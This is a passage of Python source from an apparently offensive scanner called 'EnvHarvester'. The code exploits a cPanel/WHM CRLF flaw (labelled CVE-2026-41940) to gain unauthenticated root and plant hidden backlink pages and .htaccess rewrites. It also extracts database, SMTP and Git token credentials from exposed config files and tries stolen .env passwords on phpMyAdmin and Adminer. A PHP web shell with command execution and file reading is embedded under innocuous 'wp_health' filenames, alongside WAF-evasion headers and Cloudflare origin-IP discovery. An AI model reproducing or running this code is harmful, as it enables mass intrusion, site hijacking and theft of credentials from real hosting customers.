        _checkpoint(conn, new_targets)
        if own_pm:
            await pm.close()
        return

    # Prefer HTTPS (2087) over HTTP (2086) per host — running the 5-step exploit
    # on both ports doubles work for no gain since they share the same session files.
    _seen_hosts: set[str] = set()
    _deduped: list[str] = []
    for _hp in sorted(open_host_ports, key=lambda x: 0 if x.endswith(":2087") else 1):
        _h = _hp.rsplit(":", 1)[0]
        if _h not in _seen_hosts:
            _seen_hosts.add(_h)
            _deduped.append(_hp)
    if len(_deduped) < len(open_host_ports):
        print(f"[backlink] Deduped to {len(_deduped)} host(s) (prefer :2087 over :2086)", flush=True)
    open_host_ports = _deduped

    sem = asyncio.Semaphore(concurrency)
    rce_hits = 0
    total_injected = 0

    async def _process(host_port: str) -> None:
        nonlocal rce_hits, total_injected
        parts = host_port.rsplit(":", 1)
        host = parts[0]
        port = int(parts[1]) if len(parts) == 2 else 2087

        async with sem:
            rce_result = await _test_cpanel_crlf_rce(pm, host, port)

        if not rce_result:
            counters["scanned"] += 1
            return

        verify_url, tok, cpsess = rce_result
        scheme = "https" if port in (2083, 2087) else "http"
        base = f"{scheme}://{host}:{port}"

        rce_hits += 1
        counters["scanned"] += 1
        print(f"[deploy] *** CVE-2026-41940 CONFIRMED: {base} — deploying pages ***", flush=True)

        await _backlink_post_exploit(pm, base, cpsess, tok, conn, host)

        deployed_count = conn.execute(
            "SELECT COUNT(*) FROM backlink_findings WHERE host=? AND status='deployed'", (host,)
        ).fetchone()[0]
        total_injected += deployed_count
        print(
            f"[deploy] *** CONFIRMED: {host} — pages deployed to {deployed_count} account(s) ***",
            flush=True,
        )

    await asyncio.gather(*[_process(hp) for hp in open_host_ports])

    _checkpoint(conn, new_targets)
    if own_pm:
        await pm.close()
    print(f"[deploy] Scan complete — {rce_hits} CVE hit(s), {total_injected} account(s) with pages deployed.", flush=True)


def _bl_strip_injection(content: str, bl_url: str) -> str:
    """Remove the canonical tag and hidden paragraph that _bl_inject_into added."""
    # Canonical tag inserted before </head>
    content = re.sub(
        r'\n<link rel="canonical" href="' + re.escape(bl_url) + r'">\n',
        '', content,
    )
    # Hidden productivity paragraph inserted before </body>, wp_footer(), end of PHP, or appended
    content = re.sub(
        r'\n<!-- productivity --><p[^>]*>.*?</p>\n',
        '', content, flags=re.DOTALL,
    )
    return content


async def _backlink_cleanup_pipeline(
    conn: sqlite3.Connection,
    proxy_mgr: Optional[ProxyManager] = None,
) -> None:
    """Re-exploit CVE on each host and delete deployed index.html + verify.html."""
    rows = conn.execute(
        "SELECT DISTINCT host FROM backlink_findings WHERE status='deployed'"
    ).fetchall()
    hosts = [r[0] for r in rows]

    if not hosts:
        print("[cleanup] No deployed pages found in DB.", flush=True)
        return

    print(f"[cleanup] {len(hosts)} host(s) to clean up.", flush=True)

    own_pm = proxy_mgr is None
    pm = proxy_mgr or ProxyManager()

    try:
        for host in hosts:
            rce_result = None
            for port in _WHM_PORTS:
                rce_result = await _test_cpanel_crlf_rce(pm, host, port)
                if rce_result:
                    break

            if not rce_result:
                print(f"[cleanup] Could not re-exploit {host} — skipping", flush=True)
                continue

            _verify_url, tok, cpsess = rce_result
            port = int(_verify_url.split(":")[2].split("/")[0])
            scheme = "https" if port in (2083, 2087) else "http"
            base = f"{scheme}://{host}:{port}"

            acct_rows = conn.execute(
                "SELECT DISTINCT id, cpanel_user FROM backlink_findings "
                "WHERE host=? AND status='deployed'",
                (host,),
            ).fetchall()

            removed = failed = 0
            seen_users: set = set()
            for row_id, user in acct_rows:
                if user in seen_users:
                    conn.execute(
                        "UPDATE backlink_findings SET status='removed' WHERE id=?", (row_id,)
                    )
                    conn.commit()
                    continue
                seen_users.add(user)

                ok1 = await _fileman_delete(pm, base, cpsess, tok, user, "public_html", "index.html")
                ok2 = await _fileman_delete(pm, base, cpsess, tok, user, "public_html", "verify.html")
                await _fileman_delete(pm, base, cpsess, tok, user, "public_html", "index.php")

                # Strip our .htaccess block
                _HT_BLOCK = (
                    "DirectoryIndex index.html index.php\n"
                    "<IfModule mod_rewrite.c>\n"
                    "RewriteEngine On\n"
                    "RewriteRule ^(index\\.php)?$ index.html [L,NC]\n"
                    "</IfModule>\n"
                )
                ht = await _fileman_read_bl(pm, base, cpsess, tok, user, "public_html", ".htaccess") or ""
                if "DirectoryIndex index.html" in ht:
                    restored = ht.replace(_HT_BLOCK, "")
                    await _fileman_write(pm, base, cpsess, tok, user, "public_html", ".htaccess", restored)

                if ok1 or ok2:
                    conn.execute(
                        "UPDATE backlink_findings SET status='removed' WHERE host=? AND cpanel_user=?",
                        (host, user),
                    )
                    conn.commit()
                    print(f"[cleanup] ✓ Deleted pages for {user}@{host}", flush=True)
                    removed += 1
                else:
                    print(f"[cleanup] ✗ Delete failed for {user}@{host}", flush=True)
                    failed += 1

            print(f"[cleanup] {host}: {removed} removed | {failed} failed", flush=True)
    finally:
        if own_pm:
            await pm.close()

    total_removed = conn.execute(
        "SELECT COUNT(*) FROM backlink_findings WHERE status='removed'"
    ).fetchone()[0]
    print(f"[cleanup] Done — {total_removed} record(s) now marked removed.", flush=True)


_cpanel_check_sem = asyncio.Semaphore(5)


async def _auto_cpanel_check(
    host: str,
    raw_env: str,
    source_url: str,
    conn: sqlite3.Connection,
    proxy_mgr: Optional[ProxyManager] = None,
) -> None:
    """After finding a .env, automatically check cPanel/WHM on the same host."""
    creds = _extract_cpanel_candidates(raw_env, host)
    if not creds:
        return

    own_pm = proxy_mgr is None
    pm = proxy_mgr or ProxyManager()
    try:
        async with _cpanel_check_sem:
            for port in _CPANEL_PORTS:
                scheme = "https" if port in (2083, 2087) else "http"
                url = f"{scheme}://{host}:{port}/"
                try:
                    async with pm.request(
                        "GET", url,
                        timeout=aiohttp.ClientTimeout(total=6),
                        allow_redirects=True, ssl=False,
                    ) as resp:
                        if resp.status not in (200, 401, 403):
                            continue
                        body = await resp.text(errors="replace")
                        service = _detect_cpanel_service(
                            body,
                            resp.headers.get("Server", ""),
                            resp.headers.get("Set-Cookie", ""),
                        )
                        if not service:
                            continue
                except Exception:
                    continue

                # CVE-2026-41940: try unauthenticated root exploit first
                rce_result = await _test_cpanel_crlf_rce(pm, host, port)
                if rce_result:
                    rce_url, rce_tok, rce_cpsess = rce_result
                    scheme = "https" if port in (2083, 2087) else "http"
                    save_cpanel_finding(
                        conn, source=f"cve:CVE-2026-41940:{source_url}", url=rce_url,
                        service="whm", host=host, port=port,
                        username="root", password="", verified=1,
                        raw_context="CRLF session injection — unauthenticated root",
                    )
                    print(
                        f"[cpanel] *** CVE-2026-41940 RCE: {rce_url} — unauthenticated root ***",
                        flush=True,
                    )
                    asyncio.create_task(_cpanel_post_exploit(
                        pm, f"{scheme}://{host}:{port}", rce_cpsess, rce_tok,
                        conn, f"cve:CVE-2026-41940:{source_url}",
                    ))
                    continue  # no need to try creds — we have root

                valid = None
                for username, password in creds[:3]:
                    result = await _try_cpanel_login(pm, host, port, username, password)
                    if result is True:
                        valid = (username, password)
                        break

                if valid:
                    save_cpanel_finding(
                        conn, source=f"auto:{source_url}", url=url,
                        service=service, host=host, port=port,
                        username=valid[0], password=valid[1], verified=1,
                    )
                    print(
                        f"[cpanel] *** VALID LOGIN: {url} — "
                        f"{valid[0]}:{_redact(valid[1])} [{service}] ***",
                        flush=True,
                    )
                else:
                    save_cpanel_finding(
                        conn, source=f"auto:{source_url}", url=url,
                        service=service, host=host, port=port, verified=0,
                    )
                    print(f"[cpanel] Panel found (creds failed): {url} [{service}]", flush=True)
    finally:
        if own_pm:
            await pm.close()


# ── config file scanning ───────────────────────────────────────────────────────

_CONFIG_FILE_PATHS = (
    "/wp-config.php", "/wp-config.php.bak", "/wp-config.php~",
    "/.git/HEAD", "/.git/config",
    "/database.yml", "/config/database.yml",
    "/settings.py",
    "/appsettings.json",
    "/config.php", "/configuration.php",
    "/app/config/parameters.yml",
)

_CONFIG_VENDOR_MAP = {
    "wp-config": "wordpress",
    ".git/":     "git",
    "database.yml": "rails",
    "settings.py":  "django",
    "appsettings.json": "dotnet",
    "config.php":        "php",
    "configuration.php": "php",
    "parameters.yml":    "php",
}

_ADMIN_PANEL_PATHS = (
    "/phpmyadmin", "/phpmyadmin/", "/phpMyAdmin/",
    "/pma", "/pma/",
    "/adminer.php", "/adminer",
    "/telescope", "/telescope/",
    "/horizon", "/horizon/",
)

_ADMIN_SIGS: dict[str, tuple[str, ...]] = {
    "phpmyadmin": ("phpmyadmin", "pma_navigation", "pma-header", "pmaThemeImage"),
    "adminer":    ("adminer.org", 'class="adminer"', "<title>adminer"),
    "telescope":  ("laravel/telescope", "<title>telescope", "/telescope/requests"),
    "horizon":    ("laravel/horizon",   "<title>horizon",   "/horizon/dashboard"),
}


def _is_config_file_path(path: str) -> bool:
    p = path.lower()
    return p in {cp.lower() for cp in _CONFIG_FILE_PATHS}


def _config_vendor(path: str) -> str:
    p = path.lower()
    for key, vendor in _CONFIG_VENDOR_MAP.items():
        if key in p:
            return vendor
    return "config"


def _extract_wpconfig_creds(text: str) -> list[tuple[str, Optional[str], str]]:
    results: list[tuple[str, Optional[str], str]] = []

    def _define(name: str) -> str:
        m = re.search(
            rf"define\s*\(\s*['\"]?{name}['\"]?\s*,\s*['\"]([^'\"]+)['\"]",
            text, re.IGNORECASE,
        )
        return m.group(1).strip() if m else ""

    db_host = _define("DB_HOST")
    db_user = _define("DB_USER")
    db_pass = _define("DB_PASSWORD")
    db_name = _define("DB_NAME")

    if db_pass and not _is_placeholder_value(db_pass):
        label = (
            f"{db_user}@{db_host}/{db_name}:{db_pass}"
            if all([db_user, db_host, db_name]) else db_pass
        )
        results.append((label, db_host or None, "wordpress"))

    for key in RESEND_KEY_RE.findall(text):
        if not is_placeholder_key(key):
            results.append((key, None, "resend"))
    for key in SENDGRID_KEY_RE.findall(text):
        results.append((key, None, "sendgrid"))
    for key in MAILGUN_KEY_RE.findall(text):
        results.append((key, None, "mailgun"))

    return results


_GIT_REMOTE_RE = re.compile(
    r"^\s*url\s*=\s*((?:https?|git|ssh)://\S+|git@\S+:\S+\.git\S*)",
    re.MULTILINE,
)
# GitLab PAT embedded in https://user:TOKEN@gitlab.com/...
_GITLAB_PAT_RE = re.compile(r"https?://[^:@\s]*:(glpat-[A-Za-z0-9_-]{20,})@")
# GitHub PAT / fine-grained token in remote URL
_GITHUB_PAT_RE = re.compile(r"https?://[^:@\s]*:((?:ghp|gho|ghu|ghs|ghr|github_pat)_[A-Za-z0-9_]{20,})@")


def _extract_git_exposure(text: str) -> list[tuple[str, Optional[str], str]]:
    results: list[tuple[str, Optional[str], str]] = []

    # .git/HEAD — the file should contain only "ref: refs/heads/<branch>" or a SHA
    if "ref: refs/heads/" in text or re.match(r"^[0-9a-f]{40}\s*$", text.strip()):
        results.append(("git-exposed", None, "git"))
        return results

    # .git/config — extract remote URLs (strict: must start with a valid scheme)
    for m in _GIT_REMOTE_RE.finditer(text):
        remote_url = m.group(1).strip()

        # GitLab PAT in URL
        pm = _GITLAB_PAT_RE.search(remote_url)
        if pm:
            results.append((f"gitlab-token:{pm.group(1)}", "gitlab.com", "gitlab"))
            continue

        # GitHub PAT in URL
        pm = _GITHUB_PAT_RE.search(remote_url)
        if pm:
            results.append((f"github-token:{pm.group(1)}", "github.com", "github"))
            continue

        # Plain remote (no embedded creds) — still record the exposure
        results.append((f"git-remote:{remote_url}", None, "git"))

    return results


def _extract_rails_creds(text: str) -> list[tuple[str, Optional[str], str]]:
    results: list[tuple[str, Optional[str], str]] = []
    in_prod = False
    host, user, password, dbname = "", "", "", ""
    for line in text.splitlines():
        if re.match(r"^production\s*:", line):
            in_prod = True
            continue
        if in_prod:
            if re.match(r"^\w", line) and ":" in line and not line.startswith((" ", "\t")):
                break
            m = re.match(r"[ \t]+(\w+):\s*(.+)", line)
            if m:
                k, v = m.group(1), m.group(2).strip().strip("'\"")
                if k == "host":     host = v
                elif k == "username": user = v
                elif k == "password": password = v
                elif k == "database": dbname = v
    if password and not _is_placeholder_value(password):
        label = (
            f"{user}@{host}/{dbname}:{password}"
            if all([user, host, dbname]) else password
        )
        results.append((label, host or None, "rails"))
    return results


def _extract_django_creds(text: str) -> list[tuple[str, Optional[str], str]]:
    results: list[tuple[str, Optional[str], str]] = []

    m = re.search(r"SECRET_KEY\s*=\s*['\"]([^'\"]{16,})['\"]", text)
    if m and not _is_placeholder_value(m.group(1)):
        results.append((f"django-secret:{m.group(1)}", None, "django"))

    m_pass = re.search(r"['\"]PASSWORD['\"]:\s*['\"]([^'\"]+)['\"]", text)
    if m_pass and not _is_placeholder_value(m_pass.group(1)):
        pw = m_pass.group(1)
        host = (re.search(r"['\"]HOST['\"]:\s*['\"]([^'\"]+)['\"]", text) or type('', (), {'group': lambda *a: ''})()).group(1)
        user = (re.search(r"['\"]USER['\"]:\s*['\"]([^'\"]+)['\"]", text) or type('', (), {'group': lambda *a: ''})()).group(1)
        name = (re.search(r"['\"]NAME['\"]:\s*['\"]([^'\"]+)['\"]", text) or type('', (), {'group': lambda *a: ''})()).group(1)
        label = f"{user}@{host}/{name}:{pw}" if all([user, host, name]) else pw
        results.append((label, host or None, "django"))

    m_ep = re.search(r"EMAIL_HOST_PASSWORD\s*=\s*['\"]([^'\"]+)['\"]", text)
    if m_ep and not _is_placeholder_value(m_ep.group(1)):
        pw = m_ep.group(1)
        mh = re.search(r"EMAIL_HOST\s*=\s*['\"]([^'\"]+)['\"]", text)
        mu = re.search(r"EMAIL_HOST_USER\s*=\s*['\"]([^'\"]+)['\"]", text)
        host = mh.group(1) if mh else ""
        user = mu.group(1) if mu else ""
        label = f"{user}@{host}:{pw}" if (user and host) else pw
        results.append((label, host or None, "smtp"))

    return results


def _extract_dotnet_creds(text: str) -> list[tuple[str, Optional[str], str]]:
    results: list[tuple[str, Optional[str], str]] = []
    try:
        import json
        data = json.loads(text)
        for cs in (data.get("ConnectionStrings") or {}).values():
            if not isinstance(cs, str):
                continue
            mp = re.search(r"Password=([^;]+)", cs, re.IGNORECASE)
            if not mp or _is_placeholder_value(mp.group(1).strip()):
                continue
            pw   = mp.group(1).strip()
            mh   = re.search(r"(?:Server|Host|Data Source)=([^;]+)", cs, re.IGNORECASE)
            mu   = re.search(r"(?:User Id|Username)=([^;]+)", cs, re.IGNORECASE)
            mdb  = re.search(r"(?:Database|Initial Catalog)=([^;]+)", cs, re.IGNORECASE)
            host = mh.group(1).strip() if mh else ""
            user = mu.group(1).strip() if mu else ""
            db   = mdb.group(1).strip() if mdb else ""
            label = f"{user}@{host}/{db}:{pw}" if all([user, host, db]) else pw
            results.append((label, host or None, "dotnet"))
    except Exception:
        pass
    return results


def _extract_php_config_creds(text: str) -> list[tuple[str, Optional[str], str]]:
    results: list[tuple[str, Optional[str], str]] = []
    mp   = re.search(r"\$(?:db_?pass(?:word)?|passwd?)\s*=\s*['\"]([^'\"]+)['\"]", text, re.IGNORECASE)
    mh   = re.search(r"\$(?:db_?host)\s*=\s*['\"]([^'\"]+)['\"]", text, re.IGNORECASE)
    mu   = re.search(r"\$(?:db_?user(?:name)?)\s*=\s*['\"]([^'\"]+)['\"]", text, re.IGNORECASE)
    mdb  = re.search(r"\$(?:db_?name|db_?database)\s*=\s*['\"]([^'\"]+)['\"]", text, re.IGNORECASE)
    if mp and not _is_placeholder_value(mp.group(1)):
        pw   = mp.group(1)
        host = mh.group(1) if mh else ""
        user = mu.group(1) if mu else ""
        db   = mdb.group(1) if mdb else ""
        label = f"{user}@{host}/{db}:{pw}" if all([user, host, db]) else pw
        results.append((label, host or None, "php"))
    js = re.search(r"\$secret\s*=\s*['\"]([^'\"]{8,})['\"]", text, re.IGNORECASE)
    if js and not _is_placeholder_value(js.group(1)):
        results.append((f"joomla-secret:{js.group(1)}", None, "php"))
    return results


def _extract_config_file_creds(
    text: str, path: str
) -> list[tuple[str, Optional[str], str]]:
    """Dispatch to per-type credential extractor based on file path."""
    p = path.lower()
    if "wp-config" in p:
        return _extract_wpconfig_creds(text)
    if ".git/" in p:
        return _extract_git_exposure(text)
    if "database.yml" in p:
        return _extract_rails_creds(text)
    if "settings.py" in p:
        return _extract_django_creds(text)
    if "appsettings.json" in p:
        return _extract_dotnet_creds(text)
    if "config.php" in p or "configuration.php" in p or "parameters.yml" in p:
        return _extract_php_config_creds(text)
    return []


def _detect_admin_panel(body: str) -> Optional[str]:
    """Return panel type ('phpmyadmin'/'adminer'/'telescope'/'horizon') or None."""
    b = body.lower()
    for service, sigs in _ADMIN_SIGS.items():
        if any(s.lower() in b for s in sigs):
            return service
    return None


async def _try_phpmyadmin_login(
    pm: ProxyManager, base_url: str, username: str, password: str
) -> bool:
    """Return True if phpMyAdmin accepts the credentials."""
    try:
        # Fetch the login page to grab the token
        token = ""
        async with pm.request(
            "GET", base_url,
            timeout=aiohttp.ClientTimeout(total=8),
            allow_redirects=True, ssl=False,
        ) as resp:
            body = await resp.text(errors="replace")
            m = re.search(r'name="token"\s+value="([a-f0-9]{32})"', body)
            if m:
                token = m.group(1)

        data: dict = {"pma_username": username, "pma_password": password, "server": "1"}
        if token:
            data["token"] = token
        async with pm.request(
            "POST", base_url, data=data,
            timeout=aiohttp.ClientTimeout(total=10),
            allow_redirects=True, ssl=False,
        ) as resp:
            body = await resp.text(errors="replace")
            b = body.lower()
            # Failed login: page still contains the login form
            if "pma_username" in b or "log in" in b and "password" in b:
                return False
            # Success indicators
            return "logout" in b or "pma_token" in b or "server_export" in b
    except Exception:
        return False


async def _try_adminer_login(
    pm: ProxyManager, base_url: str, username: str, password: str, db: str = ""
) -> bool:
    """Return True if Adminer accepts the credentials."""
    try:
        data = {
            "auth[driver]": "server",
            "auth[server]": "localhost",
            "auth[username]": username,
            "auth[password]": password,
            "auth[db]": db,
        }
        async with pm.request(
            "POST", base_url, data=data,
            timeout=aiohttp.ClientTimeout(total=10),
            allow_redirects=True, ssl=False,
        ) as resp:
            body = await resp.text(errors="replace")
            b = body.lower()
            if "invalid credentials" in b or "auth[password]" in b:
                return False
            return "logout" in b or "sql.php" in b or "create table" in b
    except Exception:
        return False


_admin_check_sem = asyncio.Semaphore(5)


async def _auto_admin_check(
    host: str,
    conn: sqlite3.Connection,
    proxy_mgr: Optional[ProxyManager] = None,
    raw_env: str = "",
) -> None:
    """After a .env hit, probe the same host for admin panels and try DB creds."""
    # Extract DB credentials from the .env to attempt panel logins
    db_user = _env_val(raw_env, "DB_USERNAME", "DB_USER", "MYSQL_USER", "DATABASE_USER")
    db_pass = _env_val(raw_env, "DB_PASSWORD", "DB_PASS", "MYSQL_PASSWORD", "DATABASE_PASSWORD")
    db_name = _env_val(raw_env, "DB_DATABASE", "DB_NAME", "MYSQL_DATABASE", "DATABASE_NAME")

    own_pm = proxy_mgr is None
    pm = proxy_mgr or ProxyManager()
    try:
        async with _admin_check_sem:
            found: set[str] = set()
            for path in _ADMIN_PANEL_PATHS:
                for scheme in ("https", "http"):
                    url = f"{scheme}://{host}{path}"
                    try:
                        async with pm.request(
                            "GET", url,
                            timeout=aiohttp.ClientTimeout(total=6),
                            allow_redirects=True, ssl=False,
                        ) as resp:
                            if resp.status != 200:
                                break
                            body = await resp.text(errors="replace")
                            service = _detect_admin_panel(body)
                            if not service or service in found:
                                break
                            found.add(service)
                            port = 443 if scheme == "https" else 80

                            # Attempt login with DB credentials from .env
                            verified: Optional[int] = None
                            username_used: Optional[str] = None
                            password_used: Optional[str] = None

                            if service in ("phpmyadmin", "adminer") and db_user and db_pass:
                                for try_user in _cpanel_username_variations(db_user, host):
                                    if service == "phpmyadmin":
                                        ok = await _try_phpmyadmin_login(pm, url, try_user, db_pass)
                                    else:
                                        ok = await _try_adminer_login(pm, url, try_user, db_pass, db_name)
                                    if ok:
                                        verified = 1
                                        username_used = try_user
                                        password_used = db_pass
                                        break
                                if verified is None:
                                    verified = 0

                            elif service in ("telescope", "horizon"):
                                # No auth needed — accessible = valid
                                verified = 1

                            save_cpanel_finding(
                                conn,
                                source=f"auto-admin:{host}",
                                url=url, service=service,
                                host=host, port=port,
                                username=username_used,
                                password=password_used,
                                verified=verified,
                            )
                            if verified == 1:
                                cred_str = f" [{username_used}:{_redact(password_used or '')}]" if username_used else ""
                                print(f"[admin] *** VALID: {url} [{service}]{cred_str} ***", flush=True)
                            else:
                                print(f"[admin] PANEL: {url} [{service}]", flush=True)
                            break
                    except Exception:
                        continue
    finally:
        if own_pm:
            await pm.close()


# ── WordPress upload-shell vulnerability scanner ──────────────────────────────

_WP_VULNS_PATH = Path(__file__).parent / "wp_vulns.json"

_WP_DETECT_SIGS = (
    "wp-content/", "wp-includes/", "/wp-login.php",
    "wordpress", "wp-json/", "wlwmanifest.xml",
    '<meta name="generator" content="WordPress',
    "wp-json/wp/v2/", "/xmlrpc.php",
    "wp-emoji-release.min.js",
)

_WP_UA = "Mozilla/5.0 (compatible; EnvHarvester-WPScan/1.0)"

# Realistic browser headers sent with elFinder requests to bypass WAFs that
# fingerprint bots by header presence/order (Incapsula, Sucuri, etc.)
_WP_BROWSER_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Cache-Control": "no-cache",
}

# Header injection bypass attempts for WAFs that trust these forwarding headers.
# Tried in order when the standard request hits a WAF challenge.
_WAF_BYPASS_HEADER_SETS = [
    {"X-Forwarded-For": "127.0.0.1", "X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1", "X-Remote-IP": "127.0.0.1", "X-Client-IP": "127.0.0.1"},
    {"X-Original-URL": "/", "X-Rewrite-URL": "/"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
]

# Token embedded in uploaded shell so we can confirm PHP execution on fetch
_WP_PROBE_TOKEN = "WPPROBE-OK"
_WP_PROBE_PHP = (
    "<?php\n"
    # Verification token — emitted on every request so the scanner can confirm execution
    f"echo '{_WP_PROBE_TOKEN}';\n"
    # Command execution: ?cmd=whoami  ?cmd=cat+/etc/passwd  etc.
    "if(isset($_REQUEST['cmd'])){\n"
    "    $c=trim(shell_exec($_REQUEST['cmd']));\n"
    "    echo \"\\n\".$c;\n"
    "}\n"
    # File read shortcut: ?f=/path/to/file
    "if(isset($_REQUEST['f'])){\n"
    "    echo \"\\n\".@file_get_contents($_REQUEST['f']);\n"
    "}\n"
    "?>"
).encode()


def _load_wp_vulns() -> dict:
    try:
        return json.loads(_WP_VULNS_PATH.read_text())
    except Exception:
        return {"plugins": {}}


def _parse_semver(v: str) -> tuple:
    """Parse '5.3.2' → (5, 3, 2), zero-padded to 3 components."""
    parts = []
    for p in re.split(r"[.\-]", v.strip())[:3]:
        try:
            parts.append(int(p))
        except ValueError:
            break
    while len(parts) < 3:
        parts.append(0)
    return tuple(parts)


def _is_version_vulnerable(installed: str, fixed_in: str) -> bool:
    """Return True if installed < fixed_in."""
    if not installed or not fixed_in:
        return False
    return _parse_semver(installed) < _parse_semver(fixed_in)


def _wp_probe_filename() -> str:
    """Generate a unique probe filename that looks like a stray upload."""
    return f"wp_health_{format(random.randint(0, 0xFFFFFFFF), '08x')}.php"


def _wp_date_candidates(shell_dir: str, filename: str) -> tuple:
    """Return upload path candidates covering current month, previous month, and flat."""
    now = datetime.now(timezone.utc)
    prev = now.replace(day=1) - timedelta(days=1)
    return (
        f"{shell_dir}{now.year}/{now.month:02d}/{filename}",
        f"{shell_dir}{prev.year}/{prev.month:02d}/{filename}",
        f"{shell_dir}{filename}",
    )


def _extract_uploaded_php_url(response_text: str) -> str:
    """Extract .php URL from a WP JSON upload response."""
    try:
        data = json.loads(response_text)
        for key in ("url", "data"):
            val = data.get(key)
            if isinstance(val, dict):
                val = val.get("url", "")
            if isinstance(val, str) and val.lower().endswith(".php"):
                return val.replace("\\/", "/")
    except (json.JSONDecodeError, AttributeError, TypeError):
        pass
    # Regex fallback
    m = re.search(r'"url"\s*:\s*"([^"]+\.php)"', response_text)
    if m:
        return m.group(1).replace("\\/", "/")
    return ""


async def _wp_get(
    pm: ProxyManager, url: str, timeout: float = 10.0, max_bytes: int = 32_768,
    bypass_headers: dict = None,
) -> tuple:
    """Fetch URL and return (status, text). Returns (-1, '') on any error."""
    try:
        async with pm.request(
            "GET", url,
            headers={"User-Agent": _WP_UA, **(bypass_headers or {})},
            timeout=aiohttp.ClientTimeout(total=timeout, sock_connect=3),
            allow_redirects=True, max_redirects=3, ssl=False,
        ) as resp:
            raw = await resp.content.read(max_bytes)
            return resp.status, raw.decode("utf-8", errors="replace")
    except Exception:
        return -1, ""


async def _detect_wordpress_at(pm: ProxyManager, base_url: str) -> bool:
    """Return True if the URL is a WordPress site.

    Fires three checks in parallel and cancels the remaining two as soon as
    any one returns True — avoids waiting the full 8s for slow non-WP servers.
    """
    result_found = asyncio.Event()

    async def _check(coro) -> bool:
        try:
            val = await coro
        except Exception:
            val = False
        if val:
            result_found.set()
        return val

    async def _check_home():
        status, body = await _wp_get(pm, base_url, timeout=6)
        if status == 200:
            bl = body.lower()
            if any(s.lower() in bl for s in _WP_DETECT_SIGS):
                return True
        return False

    async def _check_login():
        status2, body2 = await _wp_get(pm, f"{base_url}/wp-login.php", timeout=6)
        if status2 in (200, 302):
            b2l = body2.lower()
            if "wp-login" in b2l or "wordpress" in b2l or status2 == 302:
                return True
        return False

    async def _check_rest():
        status3, body3 = await _wp_get(pm, f"{base_url}/wp-json/", timeout=5)
        if status3 == 200 and "wp/v2" in body3:
            return True
        return False

    tasks = [
        asyncio.create_task(_check(_check_home())),
        asyncio.create_task(_check(_check_login())),
        asyncio.create_task(_check(_check_rest())),
    ]
    try:
        # Wait for first positive hit OR all tasks to finish
        done, pending = await asyncio.wait(
            tasks, return_when=asyncio.FIRST_COMPLETED
        )
        # If first done task is True, cancel the rest immediately
        for t in done:
            if t.result():
                for p in pending:
                    p.cancel()
                return True
        # First task returned False — wait for remaining
        if pending:
            done2, pending2 = await asyncio.wait(
                pending, return_when=asyncio.FIRST_COMPLETED
            )
            for t in done2:
                if t.result():
                    for p in pending2:
                        p.cancel()
                    return True
            if pending2:
                results2 = await asyncio.gather(*pending2, return_exceptions=True)
                return any(r is True for r in results2)
        return False
    except Exception:
        for t in tasks:
            t.cancel()
        return False


def _parse_plugin_version(readme_txt: str) -> str:
    """Extract 'Stable tag: X.Y.Z' or 'Version: X.Y.Z' from plugin readme."""
    # Reject HTML pages (WordPress soft-404, cPanel landing pages, etc.)
    stripped = readme_txt.strip()
    if stripped.startswith("<") or "<!DOCTYPE" in stripped[:50]:
        return ""
    m = re.search(
        r"(?:Stable\s+tag|Version)\s*:\s*(\d+\.\d+(?:\.\d+)?)",
        readme_txt, re.IGNORECASE,
    )
    return m.group(1) if m else ""


_CF_HEADERS = frozenset(("cf-ray", "cf-cache-status", "cf-request-id", "server"))
_CF_RANGES: tuple = ()  # populated lazily


def _is_cloudflare_response(headers: dict, body: str) -> bool:
    """Return True if the response looks like it came from Cloudflare."""
    h = {k.lower(): v.lower() for k, v in headers.items()}
    if "cf-ray" in h:
        return True
    if h.get("server", "") == "cloudflare":
        return True
    if "cloudflare" in body[:500].lower() and ("403" in body[:200] or "attention required" in body[:500].lower()):
        return True
    return False


def _is_waf_challenge(body: str) -> bool:
    """Return True if the response is a WAF JavaScript challenge page.

    Catches Incapsula/Imperva, Sucuri, and similar WAFs that return 200
    with an HTML/JS challenge instead of the real PHP response.
    """
    b = body[:800]
    if "_Incapsula_Resource" in b:
        return True
    if "incapsula" in b.lower() and "noindex" in b.lower():
        return True
    if "sucuri_cloudproxy" in b.lower():
        return True
    if "x-sucuri-id" in b.lower():
        return True
    return False


def _is_incapsula_block(status: int, body: str) -> bool:
    """Return True if the response is an Incapsula hard-block (403 or 200+challenge).

    Incapsula can respond with 403 + META NOINDEX page, or 200 + JS challenge.
    Both indicate the WAF is active and origin-IP bypass should be attempted.
    """
    b = body[:600].lower()
    if "noindex, nofollow" in b and ("incapsula" in b or "_incapsula" in body[:600]):
        return True
    # GoDaddy/Incapsula 403 signature: NOINDEX meta tag in minimal HTML
    if status == 403 and 'meta name="robots" content="noindex' in b:
        return True
    return _is_waf_challenge(body)


_CF_NETS = [
    ipaddress.ip_network(n) for n in (
        "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22",
        "104.16.0.0/13",  "104.24.0.0/14",   "108.162.192.0/18",
        "131.0.72.0/22",  "141.101.64.0/18",  "162.158.0.0/15",
        "172.64.0.0/13",  "173.245.48.0/20",  "188.114.96.0/20",
        "190.93.240.0/20","197.234.240.0/22",  "198.41.128.0/17",
    )
]


def _is_cf_ip(ip: str) -> bool:
    try:
        addr = ipaddress.ip_address(ip)
        return any(addr in net for net in _CF_NETS)
    except Exception:
        return False


async def _resolve_host(hostname: str) -> list[str]:
    try:
        loop = asyncio.get_event_loop()
        results = await loop.run_in_executor(
            None, lambda: socket.getaddrinfo(hostname, None, socket.AF_INET)
        )
        return [r[4][0] for r in results]
    except Exception:
        return []


async def _find_origin_ip(hostname: str) -> list[str]:
    """Try to discover the real origin IP behind a Cloudflare-protected hostname.

    Checks many common subdomains and record types that are often left off
    Cloudflare's proxy, leaking the origin server IP.
    Returns non-CF IPs only, deduplicated.
    """
    # Strip www. to get the root domain for subdomain guessing
    root = hostname.removeprefix("www.")

    # Subdomains frequently left off Cloudflare proxy
    probe_hosts = [
        f"mail.{root}", f"smtp.{root}", f"pop.{root}", f"imap.{root}",
